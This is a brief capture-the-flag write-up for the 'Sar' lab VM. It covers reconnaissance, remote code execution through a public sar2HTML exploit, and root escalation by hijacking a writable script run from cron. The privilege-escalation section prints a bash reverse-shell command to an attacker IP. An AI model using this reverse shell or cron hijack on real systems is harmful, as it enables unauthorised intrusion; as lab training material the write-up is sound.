# Sar

`netdiscover` found the VM on this IP

```
192.168.1.145
```

## Port 80

Port scan reveals port 80 is running apache web server.

The home page is just default apache site.

### Php INFO

We found PHP info at `/phpinfo.php`

### robots.txt

We found an entry: `sar2HTML` in robots.txt

![[Pasted image 20220703234609.png]]

### sar2HTML

The software version is displayed on home page.

![[Pasted image 20220703234815.png]]

we found [EDB-49344](https://www.exploit-db.com/exploits/49344) which gives us RCE as `www-data`

## Privesc
`linpeas.sh` found an intersting entry in `crontab`

![[Pasted image 20220704010544.png]]

Unfortunately, we can't modify `finally.sh`. But the contents of `finally.sh`

```
#!/bin/sh

./write.sh

```

leads us to a file we can modify: `write.sh`

we replace the existing file with a malicious script:

```
#!/bin/bash

bash -i >& /dev/tcp/192.168.1.109/443 0>&1
```


## Root flag
And we got root!

![[Pasted image 20220704010756.png]]